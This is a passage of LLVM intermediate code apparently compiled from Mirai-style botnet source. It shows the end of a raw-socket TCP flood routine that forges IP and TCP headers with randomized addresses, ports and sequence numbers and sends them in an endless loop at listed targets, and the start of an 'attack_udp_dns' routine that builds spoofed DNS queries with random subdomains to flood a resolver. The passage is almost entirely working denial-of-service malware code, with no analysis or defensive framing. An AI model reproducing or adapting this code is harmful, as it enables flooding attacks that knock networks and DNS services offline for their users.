  %164 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %163, i32 0, i32 3
  store i16 %162, i16* %164, align 4
  %165 = load i8, i8* %14, align 1
  %166 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %167 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %166, i32 0, i32 5
  store i8 %165, i8* %167, align 4
  %168 = load i8, i8* %15, align 1
  %169 = icmp ne i8 %168, 0
  br i1 %169, label %170, label %174

; <label>:170:                                    ; preds = %123
  %171 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %172 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %173 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %172, i32 0, i32 4
  store i16 %171, i16* %173, align 2
  br label %174

; <label>:174:                                    ; preds = %170, %123
  %175 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %176 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %175, i32 0, i32 6
  store i8 6, i8* %176, align 1
  %177 = load i32, i32* %28, align 4
  %178 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %179 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %178, i32 0, i32 8
  store i32 %177, i32* %179, align 4
  %180 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %181 = load i32, i32* %9, align 4
  %182 = sext i32 %181 to i64
  %183 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %180, i64 %182
  %184 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %183, i32 0, i32 1
  %185 = load i32, i32* %184, align 4
  %186 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %187 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %186, i32 0, i32 9
  store i32 %185, i32* %187, align 4
  %188 = load i16, i16* %16, align 2
  %189 = call zeroext i16 @htons(i16 zeroext %188) #7
  %190 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %191 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %190, i32 0, i32 0
  store i16 %189, i16* %191, align 4
  %192 = load i16, i16* %17, align 2
  %193 = call zeroext i16 @htons(i16 zeroext %192) #7
  %194 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %195 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %194, i32 0, i32 1
  store i16 %193, i16* %195, align 2
  %196 = load i32, i32* %18, align 4
  %197 = trunc i32 %196 to i16
  %198 = call zeroext i16 @htons(i16 zeroext %197) #7
  %199 = zext i16 %198 to i32
  %200 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %201 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %200, i32 0, i32 2
  store i32 %199, i32* %201, align 4
  %202 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %203 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %202, i32 0, i32 4
  %204 = load i16, i16* %203, align 4
  %205 = and i16 %204, -241
  %206 = or i16 %205, 160
  store i16 %206, i16* %203, align 4
  %207 = load i8, i8* %20, align 1
  %208 = sext i8 %207 to i16
  %209 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %210 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %209, i32 0, i32 4
  %211 = load i16, i16* %210, align 4
  %212 = and i16 %208, 1
  %213 = shl i16 %212, 13
  %214 = and i16 %211, -8193
  %215 = or i16 %214, %213
  store i16 %215, i16* %210, align 4
  %216 = load i8, i8* %21, align 1
  %217 = sext i8 %216 to i16
  %218 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %219 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %218, i32 0, i32 4
  %220 = load i16, i16* %219, align 4
  %221 = and i16 %217, 1
  %222 = shl i16 %221, 12
  %223 = and i16 %220, -4097
  %224 = or i16 %223, %222
  store i16 %224, i16* %219, align 4
  %225 = load i8, i8* %22, align 1
  %226 = sext i8 %225 to i16
  %227 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %228 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %227, i32 0, i32 4
  %229 = load i16, i16* %228, align 4
  %230 = and i16 %226, 1
  %231 = shl i16 %230, 11
  %232 = and i16 %229, -2049
  %233 = or i16 %232, %231
  store i16 %233, i16* %228, align 4
  %234 = load i8, i8* %23, align 1
  %235 = sext i8 %234 to i16
  %236 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %237 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %236, i32 0, i32 4
  %238 = load i16, i16* %237, align 4
  %239 = and i16 %235, 1
  %240 = shl i16 %239, 10
  %241 = and i16 %238, -1025
  %242 = or i16 %241, %240
  store i16 %242, i16* %237, align 4
  %243 = load i8, i8* %24, align 1
  %244 = sext i8 %243 to i16
  %245 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %246 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %245, i32 0, i32 4
  %247 = load i16, i16* %246, align 4
  %248 = and i16 %244, 1
  %249 = shl i16 %248, 9
  %250 = and i16 %247, -513
  %251 = or i16 %250, %249
  store i16 %251, i16* %246, align 4
  %252 = load i8, i8* %25, align 1
  %253 = sext i8 %252 to i16
  %254 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %255 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %254, i32 0, i32 4
  %256 = load i16, i16* %255, align 4
  %257 = and i16 %253, 1
  %258 = shl i16 %257, 8
  %259 = and i16 %256, -257
  %260 = or i16 %259, %258
  store i16 %260, i16* %255, align 4
  %261 = call i32 @rand() #6
  %262 = srem i32 %261, 65535
  %263 = trunc i32 %262 to i16
  %264 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %265 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %264, i32 0, i32 5
  store i16 %263, i16* %265, align 2
  br label %266

; <label>:266:                                    ; preds = %174
  %267 = load i32, i32* %9, align 4
  %268 = add nsw i32 %267, 1
  store i32 %268, i32* %9, align 4
  br label %118

; <label>:269:                                    ; preds = %118
  br label %270

; <label>:270:                                    ; preds = %428, %269
  store i32 0, i32* %9, align 4
  br label %271

; <label>:271:                                    ; preds = %425, %270
  %272 = load i32, i32* %9, align 4
  %273 = load i8, i8* %5, align 1
  %274 = zext i8 %273 to i32
  %275 = icmp slt i32 %272, %274
  br i1 %275, label %276, label %428

; <label>:276:                                    ; preds = %271
  %277 = load i8**, i8*** %11, align 8
  %278 = load i32, i32* %9, align 4
  %279 = sext i32 %278 to i64
  %280 = getelementptr inbounds i8*, i8** %277, i64 %279
  %281 = load i8*, i8** %280, align 8
  store i8* %281, i8** %32, align 8
  %282 = load i8*, i8** %32, align 8
  %283 = bitcast i8* %282 to %struct.iphdr*
  store %struct.iphdr* %283, %struct.iphdr** %33, align 8
  %284 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %285 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %284, i64 1
  %286 = bitcast %struct.iphdr* %285 to %struct.tcphdr*
  store %struct.tcphdr* %286, %struct.tcphdr** %34, align 8
  %287 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %288 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %287, i64 1
  %289 = bitcast %struct.tcphdr* %288 to i8*
  store i8* %289, i8** %35, align 8
  %290 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %291 = load i32, i32* %9, align 4
  %292 = sext i32 %291 to i64
  %293 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %290, i64 %292
  %294 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %293, i32 0, i32 2
  %295 = load i8, i8* %294, align 4
  %296 = zext i8 %295 to i32
  %297 = icmp slt i32 %296, 32
  br i1 %297, label %298, label %319

; <label>:298:                                    ; preds = %276
  %299 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %300 = load i32, i32* %9, align 4
  %301 = sext i32 %300 to i64
  %302 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %299, i64 %301
  %303 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %302, i32 0, i32 1
  %304 = load i32, i32* %303, align 4
  %305 = call i32 @ntohl(i32 %304) #7
  %306 = call i32 @rand_next()
  %307 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %308 = load i32, i32* %9, align 4
  %309 = sext i32 %308 to i64
  %310 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %307, i64 %309
  %311 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %310, i32 0, i32 2
  %312 = load i8, i8* %311, align 4
  %313 = zext i8 %312 to i32
  %314 = lshr i32 %306, %313
  %315 = add i32 %305, %314
  %316 = call i32 @htonl(i32 %315) #7
  %317 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %318 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %317, i32 0, i32 9
  store i32 %316, i32* %318, align 4
  br label %319

; <label>:319:                                    ; preds = %298, %276
  %320 = load i32, i32* %28, align 4
  %321 = icmp eq i32 %320, -1
  br i1 %321, label %322, label %326

; <label>:322:                                    ; preds = %319
  %323 = call i32 @rand_next()
  %324 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %325 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %324, i32 0, i32 8
  store i32 %323, i32* %325, align 4
  br label %326

; <label>:326:                                    ; preds = %322, %319
  %327 = load i16, i16* %13, align 2
  %328 = zext i16 %327 to i32
  %329 = icmp eq i32 %328, 65535
  br i1 %329, label %330, label %336

; <label>:330:                                    ; preds = %326
  %331 = call i32 @rand_next()
  %332 = and i32 %331, 65535
  %333 = trunc i32 %332 to i16
  %334 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %335 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %334, i32 0, i32 3
  store i16 %333, i16* %335, align 4
  br label %336

; <label>:336:                                    ; preds = %330, %326
  %337 = load i16, i16* %16, align 2
  %338 = zext i16 %337 to i32
  %339 = icmp eq i32 %338, 65535
  br i1 %339, label %340, label %346

; <label>:340:                                    ; preds = %336
  %341 = call i32 @rand_next()
  %342 = and i32 %341, 65535
  %343 = trunc i32 %342 to i16
  %344 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %345 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %344, i32 0, i32 0
  store i16 %343, i16* %345, align 4
  br label %346

; <label>:346:                                    ; preds = %340, %336
  %347 = load i16, i16* %17, align 2
  %348 = zext i16 %347 to i32
  %349 = icmp eq i32 %348, 65535
  br i1 %349, label %350, label %356

; <label>:350:                                    ; preds = %346
  %351 = call i32 @rand_next()
  %352 = and i32 %351, 65535
  %353 = trunc i32 %352 to i16
  %354 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %355 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %354, i32 0, i32 1
  store i16 %353, i16* %355, align 2
  br label %356

; <label>:356:                                    ; preds = %350, %346
  %357 = load i32, i32* %18, align 4
  %358 = icmp eq i32 %357, 65535
  br i1 %358, label %359, label %363

; <label>:359:                                    ; preds = %356
  %360 = call i32 @rand_next()
  %361 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %362 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %361, i32 0, i32 2
  store i32 %360, i32* %362, align 4
  br label %363

; <label>:363:                                    ; preds = %359, %356
  %364 = load i32, i32* %19, align 4
  %365 = icmp eq i32 %364, 65535
  br i1 %365, label %366, label %370

; <label>:366:                                    ; preds = %363
  %367 = call i32 @rand_next()
  %368 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %369 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %368, i32 0, i32 3
  store i32 %367, i32* %369, align 4
  br label %370

; <label>:370:                                    ; preds = %366, %363
  %371 = load i8, i8* %27, align 1
  %372 = icmp ne i8 %371, 0
  br i1 %372, label %373, label %376

; <label>:373:                                    ; preds = %370
  %374 = load i8*, i8** %35, align 8
  %375 = load i32, i32* %26, align 4
  call void @rand_str(i8* %374, i32 %375)
  br label %376

; <label>:376:                                    ; preds = %373, %370
  %377 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %378 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %377, i32 0, i32 7
  store i16 0, i16* %378, align 2
  %379 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %380 = bitcast %struct.iphdr* %379 to i16*
  %381 = call zeroext i16 @checksum_generic(i16* %380, i32 20)
  %382 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %383 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %382, i32 0, i32 7
  store i16 %381, i16* %383, align 2
  %384 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %385 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %384, i32 0, i32 6
  store i16 0, i16* %385, align 4
  %386 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %387 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %388 = bitcast %struct.tcphdr* %387 to i8*
  %389 = load i32, i32* %26, align 4
  %390 = sext i32 %389 to i64
  %391 = add i64 20, %390
  %392 = trunc i64 %391 to i16
  %393 = call zeroext i16 @htons(i16 zeroext %392) #7
  %394 = load i32, i32* %26, align 4
  %395 = sext i32 %394 to i64
  %396 = add i64 20, %395
  %397 = trunc i64 %396 to i32
  %398 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %386, i8* %388, i16 zeroext %393, i32 %397)
  %399 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %400 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %399, i32 0, i32 6
  store i16 %398, i16* %400, align 4
  %401 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %402 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %401, i32 0, i32 1
  %403 = load i16, i16* %402, align 2
  %404 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %405 = load i32, i32* %9, align 4
  %406 = sext i32 %405 to i64
  %407 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %404, i64 %406
  %408 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %407, i32 0, i32 0
  %409 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %408, i32 0, i32 1
  store i16 %403, i16* %409, align 2
  %410 = load i32, i32* %10, align 4
  %411 = load i8*, i8** %32, align 8
  %412 = load i32, i32* %26, align 4
  %413 = sext i32 %412 to i64
  %414 = add i64 40, %413
  %415 = bitcast %union.__CONST_SOCKADDR_ARG* %36 to %struct.sockaddr**
  %416 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %417 = load i32, i32* %9, align 4
  %418 = sext i32 %417 to i64
  %419 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %416, i64 %418
  %420 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %419, i32 0, i32 0
  %421 = bitcast %struct.sockaddr_in* %420 to %struct.sockaddr*
  store %struct.sockaddr* %421, %struct.sockaddr** %415, align 8
  %422 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %36, i32 0, i32 0
  %423 = load %struct.sockaddr*, %struct.sockaddr** %422, align 8
  %424 = call i64 @sendto(i32 %410, i8* %411, i64 %414, i32 16384, %struct.sockaddr* %423, i32 16)
  br label %425

; <label>:425:                                    ; preds = %376
  %426 = load i32, i32* %9, align 4
  %427 = add nsw i32 %426, 1
  store i32 %427, i32* %9, align 4
  br label %271

; <label>:428:                                    ; preds = %271
  br label %270

; <label>:429:                                    ; preds = %114, %108
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_dns(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i16, align 2
  %19 = alloca i8, align 1
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca %struct.iphdr*, align 8
  %27 = alloca %struct.udphdr*, align 8
  %28 = alloca %struct.dnshdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca %struct.grehdr*, align 8
  %32 = alloca [256 x i8*], align 16
  %33 = alloca i8*, align 8
  %34 = alloca %struct.iphdr*, align 8
  %35 = alloca %struct.udphdr*, align 8
  %36 = alloca %struct.dnshdr*, align 8
  %37 = alloca i8*, align 8
  %38 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %39 = load i8, i8* %5, align 1
  %40 = zext i8 %39 to i64
  %41 = call noalias i8* @calloc(i64 %40, i64 8) #6
  %42 = bitcast i8* %41 to i8**
  store i8** %42, i8*** %11, align 8
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 2, i32 0)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %12, align 1
  %47 = load i8, i8* %7, align 1
  %48 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %49 = call i32 @attack_get_opt_int(i8 zeroext %47, %struct.attack_option* %48, i8 zeroext 3, i32 65535)
  %50 = trunc i32 %49 to i16
  store i16 %50, i16* %13, align 2
  %51 = load i8, i8* %7, align 1
  %52 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %53 = call i32 @attack_get_opt_int(i8 zeroext %51, %struct.attack_option* %52, i8 zeroext 4, i32 64)
  %54 = trunc i32 %53 to i8
  store i8 %54, i8* %14, align 1
  %55 = load i8, i8* %7, align 1
  %56 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %57 = call i32 @attack_get_opt_int(i8 zeroext %55, %struct.attack_option* %56, i8 zeroext 5, i32 0)
  %58 = trunc i32 %57 to i8
  store i8 %58, i8* %15, align 1
  %59 = load i8, i8* %7, align 1
  %60 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %61 = call i32 @attack_get_opt_int(i8 zeroext %59, %struct.attack_option* %60, i8 zeroext 6, i32 65535)
  %62 = trunc i32 %61 to i16
  store i16 %62, i16* %16, align 2
  %63 = load i8, i8* %7, align 1
  %64 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %65 = call i32 @attack_get_opt_int(i8 zeroext %63, %struct.attack_option* %64, i8 zeroext 7, i32 53)
  %66 = trunc i32 %65 to i16
  store i16 %66, i16* %17, align 2
  %67 = load i8, i8* %7, align 1
  %68 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %69 = call i32 @attack_get_opt_int(i8 zeroext %67, %struct.attack_option* %68, i8 zeroext 9, i32 65535)
  %70 = trunc i32 %69 to i16
  store i16 %70, i16* %18, align 2
  %71 = load i8, i8* %7, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 0, i32 1458)
  %74 = trunc i32 %73 to i8
  store i8 %74, i8* %19, align 1
  %75 = load i8, i8* %7, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %77 = call i8* @attack_get_opt_str(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 8, i8* null)
  store i8* %77, i8** %20, align 8
  %78 = call i32 @get_dns_resolver()
  store i32 %78, i32* %22, align 4
  %79 = load i8*, i8** %20, align 8
  %80 = icmp eq i8* %79, null
  br i1 %80, label %81, label %82

; <label>:81:                                     ; preds = %4
  br label %399

; <label>:82:                                     ; preds = %4
  %83 = load i8*, i8** %20, align 8
  %84 = call i32 @util_strlen(i8* %83)
  store i32 %84, i32* %21, align 4
  %85 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %85, i32* %10, align 4
  %86 = icmp eq i32 %85, -1
  br i1 %86, label %87, label %88

; <label>:87:                                     ; preds = %82
  br label %399

; <label>:88:                                     ; preds = %82
  store i32 1, i32* %9, align 4
  %89 = load i32, i32* %10, align 4
  %90 = bitcast i32* %9 to i8*
  %91 = call i32 @setsockopt(i32 %89, i32 0, i32 3, i8* %90, i32 4) #6
  %92 = icmp eq i32 %91, -1
  br i1 %92, label %93, label %96

; <label>:93:                                     ; preds = %88
  %94 = load i32, i32* %10, align 4
  %95 = call i32 @close(i32 %94)
  br label %399

; <label>:96:                                     ; preds = %88
  store i32 0, i32* %9, align 4
  br label %97

; <label>:97:                                     ; preds = %258, %96
  %98 = load i32, i32* %9, align 4
  %99 = load i8, i8* %5, align 1
  %100 = zext i8 %99 to i32
  %101 = icmp slt i32 %98, %100
  br i1 %101, label %102, label %261

; <label>:102:                                    ; preds = %97
  store i8 0, i8* %24, align 1
  store i8 0, i8* %25, align 1
  %103 = call noalias i8* @calloc(i64 1458, i64 1) #6
  %104 = load i8**, i8*** %11, align 8
  %105 = load i32, i32* %9, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds i8*, i8** %104, i64 %106
  store i8* %103, i8** %107, align 8
  %108 = load i8**, i8*** %11, align 8
  %109 = load i32, i32* %9, align 4
  %110 = sext i32 %109 to i64
  %111 = getelementptr inbounds i8*, i8** %108, i64 %110
  %112 = load i8*, i8** %111, align 8
  %113 = bitcast i8* %112 to %struct.iphdr*
  store %struct.iphdr* %113, %struct.iphdr** %26, align 8
  %114 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %115 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %114, i64 1
  %116 = bitcast %struct.iphdr* %115 to %struct.udphdr*
  store %struct.udphdr* %116, %struct.udphdr** %27, align 8
  %117 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %118 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %117, i64 1
  %119 = bitcast %struct.udphdr* %118 to %struct.dnshdr*
  store %struct.dnshdr* %119, %struct.dnshdr** %28, align 8
  %120 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %121 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %120, i64 1
  %122 = bitcast %struct.dnshdr* %121 to i8*
  store i8* %122, i8** %29, align 8
  %123 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %124 = bitcast %struct.iphdr* %123 to i8*
  %125 = load i8, i8* %124, align 4
  %126 = and i8 %125, 15
  %127 = or i8 %126, 64
  store i8 %127, i8* %124, align 4
  %128 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %129 = bitcast %struct.iphdr* %128 to i8*
  %130 = load i8, i8* %129, align 4
  %131 = and i8 %130, -16
  %132 = or i8 %131, 5
  store i8 %132, i8* %129, align 4
  %133 = load i8, i8* %12, align 1
  %134 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %135 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %134, i32 0, i32 1
  store i8 %133, i8* %135, align 1
  %136 = load i8, i8* %19, align 1
  %137 = zext i8 %136 to i64
  %138 = add i64 41, %137
  %139 = add i64 %138, 2
  %140 = load i32, i32* %21, align 4
  %141 = sext i32 %140 to i64
  %142 = add i64 %139, %141
  %143 = add i64 %142, 4
  %144 = trunc i64 %143 to i16
  %145 = call zeroext i16 @htons(i16 zeroext %144) #7
  %146 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %147 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %146, i32 0, i32 2
  store i16 %145, i16* %147, align 2
  %148 = load i16, i16* %13, align 2
  %149 = call zeroext i16 @htons(i16 zeroext %148) #7
  %150 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %151 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %150, i32 0, i32 3
  store i16 %149, i16* %151, align 4
  %152 = load i8, i8* %14, align 1
  %153 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %154 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %153, i32 0, i32 5
  store i8 %152, i8* %154, align 4
  %155 = load i8, i8* %15, align 1
  %156 = icmp ne i8 %155, 0
  br i1 %156, label %157, label %161

; <label>:157:                                    ; preds = %102
  %158 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %159 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %160 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %159, i32 0, i32 4
  store i16 %158, i16* %160, align 2
  br label %161

; <label>:161:                                    ; preds = %157, %102
  %162 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %163 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %162, i32 0, i32 6
  store i8 17, i8* %163, align 1
  %164 = load i32, i32* @LOCAL_ADDR, align 4
  %165 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %166 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %165, i32 0, i32 8
  store i32 %164, i32* %166, align 4
  %167 = load i32, i32* %22, align 4
  %168 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %169 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %168, i32 0, i32 9
  store i32 %167, i32* %169, align 4
  %170 = load i16, i16* %16, align 2
  %171 = call zeroext i16 @htons(i16 zeroext %170) #7
  %172 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %173 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %172, i32 0, i32 0
  store i16 %171, i16* %173, align 2
  %174 = load i16, i16* %17, align 2
  %175 = call zeroext i16 @htons(i16 zeroext %174) #7
  %176 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %177 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %176, i32 0, i32 1
  store i16 %175, i16* %177, align 2
  %178 = load i8, i8* %19, align 1
  %179 = zext i8 %178 to i64
  %180 = add i64 21, %179
  %181 = add i64 %180, 2
  %182 = load i32, i32* %21, align 4
  %183 = sext i32 %182 to i64
  %184 = add i64 %181, %183
  %185 = add i64 %184, 4
  %186 = trunc i64 %185 to i16
  %187 = call zeroext i16 @htons(i16 zeroext %186) #7
  %188 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %189 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %188, i32 0, i32 2
  store i16 %187, i16* %189, align 2
  %190 = load i16, i16* %18, align 2
  %191 = call zeroext i16 @htons(i16 zeroext %190) #7
  %192 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %193 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %192, i32 0, i32 0
  store i16 %191, i16* %193, align 2
  %194 = call zeroext i16 @htons(i16 zeroext 256) #7
  %195 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %196 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %195, i32 0, i32 1
  store i16 %194, i16* %196, align 2
  %197 = call zeroext i16 @htons(i16 zeroext 1) #7
  %198 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %199 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %198, i32 0, i32 2
  store i16 %197, i16* %199, align 2
  %200 = load i8, i8* %19, align 1
  %201 = load i8*, i8** %29, align 8
  %202 = getelementptr inbounds i8, i8* %201, i32 1
  store i8* %202, i8** %29, align 8
  store i8 %200, i8* %201, align 1
  %203 = load i8, i8* %19, align 1
  %204 = zext i8 %203 to i32
  %205 = load i8*, i8** %29, align 8
  %206 = sext i32 %204 to i64
  %207 = getelementptr inbounds i8, i8* %205, i64 %206
  store i8* %207, i8** %29, align 8
  %208 = load i8*, i8** %29, align 8
  store i8* %208, i8** %30, align 8
  %209 = load i8*, i8** %29, align 8
  %210 = getelementptr inbounds i8, i8* %209, i64 1
  %211 = load i8*, i8** %20, align 8
  %212 = load i32, i32* %21, align 4
  %213 = add nsw i32 %212, 1
  call void @util_memcpy(i8* %210, i8* %211, i32 %213)
  store i32 0, i32* %23, align 4
  br label %214

; <label>:214:                                    ; preds = %240, %161
  %215 = load i32, i32* %23, align 4
  %216 = load i32, i32* %21, align 4
  %217 = icmp slt i32 %215, %216
  br i1 %217, label %218, label %243

; <label>:218:                                    ; preds = %214
  %219 = load i8*, i8** %20, align 8
  %220 = load i32, i32* %23, align 4
  %221 = sext i32 %220 to i64
  %222 = getelementptr inbounds i8, i8* %219, i64 %221
  %223 = load i8, i8* %222, align 1
  %224 = sext i8 %223 to i32
  %225 = icmp eq i32 %224, 46
  br i1 %225, label %226, label %236

; <label>:226:                                    ; preds = %218
  %227 = load i8, i8* %24, align 1
  %228 = load i8*, i8** %30, align 8
  store i8 %227, i8* %228, align 1
  store i8 0, i8* %24, align 1
  %229 = load i8, i8* %25, align 1
  %230 = add i8 %229, 1
  store i8 %230, i8* %25, align 1
  %231 = load i8*, i8** %29, align 8
  %232 = load i32, i32* %23, align 4
  %233 = sext i32 %232 to i64
  %234 = getelementptr inbounds i8, i8* %231, i64 %233
  %235 = getelementptr inbounds i8, i8* %234, i64 1
  store i8* %235, i8** %30, align 8
  br label %239

; <label>:236:                                    ; preds = %218
  %237 = load i8, i8* %24, align 1
  %238 = add i8 %237, 1
  store i8 %238, i8* %24, align 1
  br label %239

; <label>:239:                                    ; preds = %236, %226
  br label %240

; <label>:240:                                    ; preds = %239
  %241 = load i32, i32* %23, align 4
